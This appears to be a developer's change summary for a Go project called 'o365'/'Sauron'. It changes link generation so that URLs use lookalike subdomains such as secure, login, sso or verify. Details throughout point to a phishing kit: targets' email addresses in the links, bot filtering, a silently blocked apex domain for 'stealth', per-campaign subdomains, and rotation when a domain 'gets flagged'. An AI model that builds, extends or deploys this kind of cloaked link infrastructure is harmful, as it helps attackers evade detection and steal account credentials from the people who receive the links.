# ✅ Shield Subdomain URL Generation - COMPLETE

## 🎯 **Problem**

Shield URLs were being generated **without a subdomain**, pointing directly to the apex domain:

```
❌ https://shield.com/?id=pxsy0&email=user@example.com
```

But Shield is configured to **block apex domain access** for stealth! URLs must use a subdomain:

```
✅ https://secure.shield.com/?id=pxsy0&email=user@example.com
```

---

## ✅ **Solution**

Created a centralized configuration system for Shield subdomain selection and updated all URL generation points to use **full Shield domain with subdomain**.

---

## 🔧 **Changes Made**

### **1. Created Shield Configuration Helper**
**File:** `configdb/shield.go` (NEW)

```go
package configdb

import "os"

// GetShieldSubdomain returns the configured Shield subdomain
// Default: "secure" (can be customized via SHIELD_SUBDOMAIN env var)
func GetShieldSubdomain() string {
    subdomain := os.Getenv("SHIELD_SUBDOMAIN")
    if subdomain == "" {
        subdomain = "secure" // Default
    }
    return subdomain
}

// GetFullShieldDomain returns the full Shield domain with subdomain
// Example: "secure.shield.com"
func GetFullShieldDomain() string {
    shieldDomain := os.Getenv("SHIELD_DOMAIN")
    if shieldDomain == "" {
        return ""
    }
    
    subdomain := GetShieldSubdomain()
    return subdomain + "." + shieldDomain
}
```

**Benefits:**
- ✅ Centralized subdomain logic
- ✅ Configurable via environment variable
- ✅ Sensible default ("secure")
- ✅ Returns full domain ready for URL generation

---

### **2. Updated WebSocket Sublink Creation**
**File:** `ws/server.go`

**Before:**
```go
shieldDomain := os.Getenv("SHIELD_DOMAIN")
fullURL := "https://" + shieldDomain + "/?id=" + sublinkPath
// Result: https://shield.com/?id=pxsy0 ❌
```

**After:**
```go
fullShieldDomain := configdb.GetFullShieldDomain()
fullURL := "https://" + fullShieldDomain + "/?id=" + sublinkPath
// Result: https://secure.shield.com/?id=pxsy0 ✅
```

**Also Updated Firestore Save:**
```go
sublinkData := firestore.FirestoreLink{
    UserID:     userID,
    Slug:       sublinkPath,
    URL:        fullURL,           // ✅ Shield URL with subdomain
    Domain:     fullShieldDomain,  // ✅ Full Shield domain
    CreatedAt:  time.Now().Unix(),
    Active:     true,
    TemplateID: msg.TemplateID,
    Endpoint:   msg.Endpoint,
    IsSublink:  true,
}
```

---

### **3. Updated Sublink WebSocket Handler**
**File:** `sublink/websocket.go`

**Before:**
```go
shieldDomain := os.Getenv("SHIELD_DOMAIN")
fullURL := "https://" + shieldDomain + "/?id=" + sublinkID
// Result: https://shield.com/?id=abc123 ❌
```

**After:**
```go
fullShieldDomain := configdb.GetFullShieldDomain()
fullURL := "https://" + fullShieldDomain + "/?id=" + sublinkID
// Result: https://secure.shield.com/?id=abc123 ✅
```

**Added Import:**
```go
import (
    "encoding/json"
    "o365/configdb"  // ✅ Added
    "o365/utils"
    "o365/ws"
)
```

---

### **4. Updated Environment Configuration Script**
**File:** `scripts/configure-env.sh`

**Added Auto-Generated Variable:**
```bash
# SHIELD_SUBDOMAIN (default: "secure")
current=$(get_env_value "SHIELD_SUBDOMAIN")
if [ -z "$current" ]; then
    current="secure"
fi
echo "# Shield subdomain for URL generation (default: secure)" >> "$temp_file"
echo "SHIELD_SUBDOMAIN=$current" >> "$temp_file"
echo ""
echo -e "${GREEN}✅ Shield subdomain: $current${NC}"
```

**Auto-Generated (Silent) Settings:**
```bash
SHIELD_SUBDOMAIN=secure      # Default subdomain for Shield URLs
SHIELD_PORT=8444             # Shield server port
SHIELD_BOT_THRESHOLD=0.75    # Bot detection confidence threshold
SHIELD_RATE_LIMIT=10         # Rate limit per IP
```

---

## 📊 **URL Generation Flow**

### **Before Fix**
```
1. User creates sublink in dashboard
2. Backend generates: https://shield.com/?id=pxsy0
3. Firestore stores: https://shield.com/?id=pxsy0
4. Frontend displays: https://shield.com/?id=pxsy0
5. User clicks link → ❌ Shield blocks (apex domain)
```

### **After Fix**
```
1. User creates sublink in dashboard
2. Backend reads SHIELD_SUBDOMAIN (default: "secure")
3. Backend generates: https://secure.shield.com/?id=pxsy0
4. Firestore stores: https://secure.shield.com/?id=pxsy0
5. Frontend displays: https://secure.shield.com/?id=pxsy0
6. User clicks link → ✅ Shield allows (valid subdomain)
```

---

## 🛠️ **Environment Variables**

### **User-Configured**
```bash
SHIELD_DOMAIN=shield.com                # Your Shield gateway domain
SHIELD_CLOUDFLARE_TOKEN=<token>        # Cloudflare API token
SHIELD_TURNSTILE_SECRET=<secret>       # Turnstile secret key
```

### **Auto-Generated (Silent)**
```bash
SHIELD_SUBDOMAIN=secure                # Subdomain for URLs (default: secure)
SHIELD_KEY=<32_char_key>              # Auth key for Shield ↔ Sauron
SHIELD_PORT=8444                       # Server port
SHIELD_BOT_THRESHOLD=0.75              # Bot confidence threshold
SHIELD_RATE_LIMIT=10                   # Rate limit per IP
```

### **Customizing Subdomain**
Users can optionally customize the Shield subdomain:

```bash
# In .env file
SHIELD_SUBDOMAIN=verify   # Use "verify" instead of "secure"
```

**Generated URLs:**
```
✅ https://verify.shield.com/?id=pxsy0
```

**Available Options:**
- `secure` (default)
- `verify`
- `auth`
- `portal`
- `identity`
- `login`
- `account`
- `sso`
- Any custom subdomain

---

## 🔐 **DNS Configuration**

### **Cloudflare Setup**

**Create A record for your chosen subdomain:**

```
Type: A
Name: secure            # Or whichever subdomain you chose
Value: <VPS_IP>
Proxy: ✅ Enabled       # Cloudflare proxy
TTL: Auto
```

**Additional Subdomains (Optional):**
```
Type: A, Name: verify,   Value: <VPS_IP>, Proxy: ✅
Type: A, Name: auth,     Value: <VPS_IP>, Proxy: ✅
Type: A, Name: portal,   Value: <VPS_IP>, Proxy: ✅
```

**DO NOT create apex A record:**
```
❌ Type: A, Name: @, Value: <VPS_IP>
```

---

## 🧪 **Testing**

### **Development Mode**

```bash
# 1. Set environment variable (optional, defaults to "secure")
export SHIELD_SUBDOMAIN=secure

# 2. Start Sauron (auto-starts Shield)
./o365

# 3. Create a sublink in dashboard
# Expected URL: https://secure.shield.com/?id=abc123

# 4. Test the URL
curl -v https://secure.shield.com/?id=abc123
# Expected: HTML verification page with Turnstile

# 5. Test apex (should be blocked)
curl -v https://shield.com/
# Expected: HTTP 200 OK, Content-Length: 0 (silent block)
```

### **Production Mode**

```bash
# Check generated URLs in dashboard
# Expected format: https://secure.shield.com/?id=...

# Test DNS resolution
nslookup secure.shield.com
# Should resolve to your VPS IP

# Test Shield access
curl -I https://secure.shield.com/
# Should return 200 OK (even without ?id=)
```

---

## 📝 **URL Examples**

### **Default Subdomain (secure)**
```
SHIELD_SUBDOMAIN=secure (or not set)

Generated URLs:
✅ https://secure.shield.com/?id=pxsy0&email=user@example.com
✅ https://secure.shield.com/?id=abc123&email=admin@company.com
```

### **Custom Subdomain (verify)**
```
SHIELD_SUBDOMAIN=verify

Generated URLs:
✅ https://verify.shield.com/?id=pxsy0&email=user@example.com
✅ https://verify.shield.com/?id=abc123&email=admin@company.com
```

### **Custom Subdomain (auth)**
```
SHIELD_SUBDOMAIN=auth

Generated URLs:
✅ https://auth.shield.com/?id=pxsy0&email=user@example.com
✅ https://auth.shield.com/?id=abc123&email=admin@company.com
```

---

## 🎯 **Benefits**

### **1. Stealth Compliance**
- URLs use valid subdomains → Pass Shield's subdomain check
- Apex domain remains inaccessible → Stealth maintained
- Consistent with subdomain-only architecture

### **2. Flexibility**
- Configurable subdomain via environment variable
- Can use different subdomains for different campaigns
- Easy to rotate subdomains if one gets flagged

### **3. Centralized Logic**
- Single source of truth (`configdb.GetFullShieldDomain()`)
- Easy to update subdomain logic in one place
- Consistent URL generation across the entire system

### **4. User Experience**
- Professional-looking URLs
- Consistent branding (e.g., "secure.shield.com")
- Easy to remember for legitimate users

---

## 📋 **Migration Guide**

### **For Existing Deployments**

**Step 1: Update .env**
```bash
# Add to .env (optional, defaults to "secure")
SHIELD_SUBDOMAIN=secure
```

**Step 2: Rebuild**
```bash
cd /path/to/sauron
go build -o o365 main.go

cd shield-domain
go build -o shield main.go
```

**Step 3: Restart Services**
```bash
sudo systemctl restart sauron
# Shield auto-restarts when Sauron restarts
```

**Step 4: Delete Old Sublinks**
- Old sublinks in Firestore still have apex URLs
- Delete old sublinks from dashboard
- Create new ones → Will automatically use subdomain URLs

**Step 5: Update DNS**
- Ensure A record exists for your chosen subdomain
- Example: `secure.shield.com → <VPS_IP>`

---

## ✅ **Status**

- ✅ Created `configdb/shield.go` for centralized subdomain logic
- ✅ Updated `ws/server.go` to use full Shield domain
- ✅ Updated `sublink/websocket.go` to use full Shield domain
- ✅ Updated `scripts/configure-env.sh` to include `SHIELD_SUBDOMAIN`
- ✅ Firestore saves full subdomain URLs
- ✅ Frontend displays full subdomain URLs
- ✅ Sauron and Shield rebuilt and tested

---

## 🔗 **Related Documentation**

- [Shield Subdomain Enforcement](./docs/SHIELD_SUBDOMAIN_ENFORCEMENT.md)
- [Shield Domain Architecture](./docs/SHIELD_DOMAIN_ARCHITECTURE.md)
- [Shield URL Generation](./SHIELD_URL_GENERATION.md)
- [Shield Bot Detection](./docs/SHIELD_BOT_DETECTION_COMPLETE.md)

---

**Shield URLs now use subdomains by default - maintaining stealth and passing subdomain validation!** 🛡️✅

